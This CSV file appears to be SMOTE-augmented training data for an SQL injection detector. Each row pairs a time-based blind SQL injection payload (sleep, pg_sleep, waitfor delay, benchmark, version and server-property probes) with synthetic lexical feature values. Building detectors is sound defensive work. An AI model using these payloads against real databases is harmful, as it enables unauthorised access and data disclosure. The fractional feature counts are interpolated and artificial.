id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000126,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.687663876004039,104.24179282901176,32.330243237524456,4.053901297092199,43.91154959148731,6.330243237524458,35.44650450831703,18.553495491682973,0.41737185200145144,0.06187661965961039,0.3412762774635538,0.17947525087538435,2.4465045083170276,0.0,2.0,0.0,0.0,0.0,0.7767477458414861,6.0,1.3877787807814457e-17,0.0,1.7767477458414858,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.7767477458414861,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7767477458414861,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.776747745841486
SMOTE_000127,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.5319370302574234,111.7401750092231,28.854803500184463,4.02780969621587,57.22489100479601,3.8548035001844614,34.096070003689235,16.564410500553386,0.5118269825853266,0.035045782058830674,0.30155229023234253,0.15157494512350023,3.9999999999999996,0.0,2.0,0.0,0.0,0.0,0.0,5.419214000737847,1.3877787807814457e-17,0.1451964998155384,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000128,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.018796140952789735,33.053558699144546,16.982147100285154,3.5002821700733415,13.0,0.9821471002851521,10.053558699144542,9.017852899714848,0.3933533138982499,0.029762033341974317,0.30406721387232705,0.2728174388874487,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,2.017852899714848,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000129,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,1.5020340235394105,85.43675453819351,24.603242631225797,3.3152500867437595,22.57945861793547,12.603242631225797,39.6032426312258,10.65081065780645,0.2616216188894009,0.14454622739238412,0.4678805165488723,0.1259516371693427,1.1102230246251565e-16,0.3254053289032245,2.0,0.0,0.0,1.3254053289032246,0.0,6.0,1.3877787807814457e-17,1.0,0.0,3.3254053289032246,0.0,0.32540532890322443,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.3254053289032245,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3254053289032246
SMOTE_000130,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,2.219511979013688,62.38700293235014,19.53766568921662,2.92035339408314,11.61299706764986,10.0,31.84933724313352,8.924668621566761,0.18682422720442868,0.1603816523249228,0.5100408513987297,0.14275326907191888,0.46233431078338033,0.0,0.0,0.0,0.0,0.4623343107833803,0.0,6.0,1.3877787807814457e-17,0.0,1.0,0.46233431078338016,0.46233431078338033,0.0,0.0,1.0,0.0,0.4623343107833803,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4623343107833802,0.5376656892166197,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000131,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,1.999030037868454,42.08349294960324,15.528757648221138,3.0651135912838416,16.87940941699512,1.6178105879447156,17.43970470849756,6.146568236165853,0.37764879700581516,0.046228571143591225,0.4255171745532145,0.15060545729737915,1.7643788241105685,0.0,0.0,0.0,0.0,0.0,0.0,3.3821894120552844,1.3877787807814457e-17,0.38218941205528445,0.0,0.0,1.0,0.0,0.0,0.6178105879447156,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.38218941205528434,0.0,0.0,0.0,0.38218941205528434,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6178105879447156,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3821894120552842
SMOTE_000132,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.40639179057578567,34.992765405363855,16.0,3.078198126040993,11.0,0.0,15.39421232429108,8.59855308107277,0.3159455916731399,1.3877787807814457e-17,0.43809868590167617,0.245955722425184,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.59855308107277,1.3877787807814457e-17,4.0,0.0,0.9999999999999999,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000133,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.3864292123832469,29.534228252118346,16.0,3.3461984837038052,11.0,0.0,10.427382601694674,8.106845650423669,0.3733503947532436,1.3877787807814457e-17,0.3519795262961077,0.2746700789506487,1.1102230246251565e-16,1.1068456504236688,0.0,0.0,0.0,0.106845650423669,0.0,2.0,1.3877787807814457e-17,4.0,0.0,0.106845650423669,0.0,1.0,0.0,0.893154349576331,0.0,0.10684565042366878,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000134,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.09309240280975421,39.54714593929507,16.0,2.9820597617581552,11.0,0.0,18.622621616079222,9.924524323215845,0.28451495822746437,1.3877787807814457e-17,0.4626017210975464,0.2528833206749892,1.1102230246251565e-16,2.0,0.0,0.0,0.0,1.0,0.0,2.924524323215844,1.3877787807814457e-17,4.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000135,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.09287797556476239,37.58189180772456,17.0,3.3438041685248194,13.0,0.0,13.665513446179645,10.916378361544911,0.34643971810173907,1.3877787807814457e-17,0.3629529710101138,0.2906073108881472,1.1102230246251565e-16,1.0,2.0,0.0,0.0,0.0,0.0,2.9163783615449113,1.3877787807814457e-17,5.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000136,attack,time,"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000056,0.5818520388990169,102.60121820054145,30.496476770450588,3.623282821935206,29.61531111873911,16.99295354090117,43.99295354090117,12.0,0.2875071906340531,0.16436961401072103,0.4300451703261475,0.11807802502907841,1.1102230246251565e-16,1.0,2.0,0.0,0.0,1.8741191926126466,0.0,6.0,0.12588080738735347,1.0,0.0,3.874119192612647,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8741191926126467,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8741191926126466
SMOTE_000137,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.7566440861518533,28.424552426991333,19.424552426991333,4.124132686126133,13.939641941593067,3.545268543805202,2.5150895146017334,8.424552426991331,0.4880100016842726,0.13034022332999823,0.0907179529760187,0.29093182200971046,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,1.939641941593065,0.4849104853982662,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000138,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,0.8620539451996666,87.84041839648981,27.15958160351019,3.7857287332323564,20.20209198244904,27.72334717191847,31.276652828081534,8.638326414040765,0.22990273094686908,0.3154757598786077,0.35620858110978065,0.09841292806474254,0.1595816035101918,0.0,0.0,0.0,0.0,1.8404183964898082,0.0,4.478744810530575,0.15958160351019163,0.0,1.0,1.8404183964898082,0.15958160351019174,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.8404183964898083,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.840418396489808
SMOTE_000139,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,0.2333535388690418,40.424979231065414,15.884995846213084,2.893036598806469,10.942497923106542,1.0575020768934582,19.65498753863925,8.769991692426167,0.27141435350562443,0.02669756563459197,0.4857237643295837,0.2161643165301999,0.05750207689345843,0.0,0.0,0.0,0.0,0.0,0.0,3.942497923106542,1.3877787807814457e-17,3.769991692426167,0.0,0.0,0.057502076893458376,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9424979231065418,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9424979231065418
SMOTE_000140,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,0.42566255083572546,107.34076618482143,29.65923381517856,3.416546080602438,35.56794364136907,9.545645086904749,49.11358872827381,13.113588728273813,0.33114243264889087,0.08915526941118135,0.4575681458001032,0.12213415213982459,0.9432056358630936,0.22717745654762664,0.0,0.0,1.0,0.9432056358630934,0.0,9.056794364136906,1.3877787807814457e-17,0.0,0.0,1.9432056358630936,0.9432056358630934,0.05679436413690658,0.0,0.9432056358630934,0.0,0.9432056358630936,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.9432056358630935,1.0,0.05679436413690658,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000141,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,1.7062802893022058,112.7115245904817,30.496654312215803,3.5052611465089187,38.97323449772641,10.0,49.7449814683237,13.993308624431602,0.3432949482810831,0.0893518874259657,0.44355487506664504,0.12379828922630619,1.4966543122158007,0.0,0.0,0.0,1.0,1.0,0.0,9.0,1.3877787807814457e-17,0.0,0.0,2.4966543122158007,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.2483271561079003,2.2483271561079,0.0,1.0,1.2483271561079003,0.24832715610790032,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.744981468323701
SMOTE_000142,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000037,0.048857246669397066,100.0,33.71948602642611,4.083134914336004,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0,6.0,1.3877787807814457e-17,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000143,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.070701096883642,43.84181998245245,16.82931151302454,2.999450942445265,13.073278782561347,0.4146557565122704,20.939229686866558,9.41465575651227,0.2978576429142058,0.005923653664461001,0.47082647054531707,0.2253922328760162,1.621983634768404,0.0,0.0,0.0,0.0,1.0,0.0,3.6219836347684042,1.3877787807814457e-17,3.170688486975461,0.0,0.9999999999999999,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.20732787825613477,0.7926721217438653,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000144,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.0005932476674267208,35.00683783316544,23.000569819430453,4.283271950129648,16.00366312491006,2.0001628055515592,5.0026048888249335,12.000407013878895,0.4571473719186566,0.057140941783427046,0.14287082399592924,0.34284086230198707,2.000162805551558,0.0,2.0,0.0,0.0,0.0,0.0,1.0004070138788945,1.3877787807814457e-17,3.999674388896885,1.0,2.0001628055515583,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,8.140277577911581e-05,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000814027757787
SMOTE_000145,attack,time,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000060,0.545089980626121,129.14351800267139,31.610690001214266,3.708486214435697,49.98779400315709,10.0,52.389309998785734,16.76641400072856,0.3866253265852735,0.07747671751604952,0.40615044367829567,0.12974751222038133,2.8442760004857064,0.0,0.0,0.0,1.0,1.0,0.0,9.077861999757147,1.3877787807814457e-17,0.0,0.0,3.844276000485707,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9221380002428533,2.922138000242853,0.0,1.0,1.9221380002428532,0.9221380002428533,0.0778619997571467,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.844276000485706
SMOTE_000146,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,0.44757933889040935,63.06027352535694,25.578085322501398,3.8133807147224354,21.276717695716684,10.0,21.783555829640257,10.0,0.3375761897996772,0.15858067082004726,0.3452624685602283,0.15858067082004726,2.879452949286114,0.0,0.0,0.0,0.0,1.0,0.0,3.180820576070829,1.3877787807814457e-17,0.0,0.06027352535694297,2.879452949286114,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9397264746430569,0.939726474643057,0.0,0.939726474643057,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8794529492861143
SMOTE_000147,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0,100.0,33.0,4.070862758735813,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0,6.0,1.3877787807814457e-17,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000148,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.20978590709815595,43.24716345729958,16.415721152433193,3.0732536897646465,13.0,0.41572115243319274,18.831442304866385,11.0,0.3009454365370928,0.009238247831848748,0.43517017702274907,0.2546461386083093,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,4.0,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000149,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,1.1783337081609087,45.0,17.0,3.0740066546775076,13.0,0.46853388765988235,20.0,11.531466112340118,0.28888888888888886,0.010411864170219609,0.4444444444444444,0.25625480249644705,1.1102230246251565e-16,0.5314661123401181,2.0,0.0,0.0,0.0,0.0,4.0,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.531466112340118,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000150,attack,time,"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000051,1.0841050474768013,106.96110094294409,30.0,3.826424405050458,26.0,29.33981650950932,39.9611009429441,11.660183490490683,0.24325388576498208,0.2746208312274995,0.3731534482210078,0.10897183478651067,1.0,0.0,2.0,0.0,0.0,2.0,0.0,5.660183490490683,1.3877787807814457e-17,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.33981650950931724,0.6601834904906828,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000151,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.24446186588840926,73.82496050470498,25.03172925018096,3.545572592602115,16.285563251628645,18.0,30.285563251628645,9.253834001447684,0.22023616290211864,0.24452064631455794,0.4104188878134415,0.12482430296988185,1.0951877505428813,0.0,0.0,0.0,0.0,2.0,0.0,4.063458500361921,1.3877787807814457e-17,0.0,1.0,2.126917000723842,1.0,0.0,0.0,0.9682707498190393,0.0,1.0,1.0,0.0,0.0,0.0,0.031729250180960476,0.031729250180960455,0.0,1.0,0.0,0.9682707498190393,0.03172925018096051,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0317292501809603
SMOTE_000152,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.2180693223054959,118.45190218222046,30.086541760702033,4.022368902516001,60.36536042151842,4.086541760702033,36.94230549286531,17.05769450713469,0.5090682232811129,0.03466309754576977,0.3120515943620853,0.14421708481103196,3.9423054928653105,0.0,2.0,0.0,0.0,0.0,0.028847253567344487,6.0,1.3877787807814457e-17,0.0,1.0288472535673445,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.028847253567344487,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.028847253567344657,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0288472535673447
SMOTE_000153,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,1.1602233264267174,96.81939027731039,27.91202882989551,3.546837157349875,27.606463425770126,16.25924612783282,41.953680723707436,11.0,0.2839234138625111,0.1660634577875171,0.43354688959731935,0.11646623875265247,1.1102230246251565e-16,0.21759423402089753,2.0,0.0,0.0,1.7824057659791026,0.0,5.782405765979102,0.2175942340208975,1.0,0.0,3.782405765979102,0.0,0.2175942340208975,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7824057659791025,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7824057659791026
SMOTE_000154,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,2.4974268450023493,81.10354567337082,26.080472756449442,3.7053286021625977,18.701181891123603,23.94260016047193,30.0,8.459763621775279,0.22969015368587953,0.2913988153165903,0.3731154467308337,0.10579558426669645,0.4597636217752792,0.0,0.0,0.0,0.0,2.0,0.0,4.0,1.3877787807814457e-17,0.0,1.0,2.0,0.4597636217752792,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.5402363782247207,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.45976362177527913,0.5402363782247207,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000155,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,1.2950228314893502,49.48890048227108,17.39556019290843,2.9775172509196377,10.302219903545785,6.977800964542151,24.0,8.20887961418314,0.20908960369059004,0.13681962675572845,0.48604705388980995,0.16804371566387152,1.1102230246251565e-16,1.302219903545785,0.0,0.0,0.0,1.0,0.0,4.0,1.3877787807814457e-17,1.2088796141831395,0.6977800964542151,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000156,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,0.6008767891514025,104.24079886757829,29.240798867578278,3.5914016648966975,30.0,18.0,45.0,11.240798867578278,0.28780000311104864,0.1726800018666292,0.43170000466657305,0.10781999035574906,1.1102230246251565e-16,0.24079886757827731,2.0,0.0,0.0,2.0,0.0,6.0,1.3877787807814457e-17,1.0,0.0,4.0,0.0,0.2407988675782773,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
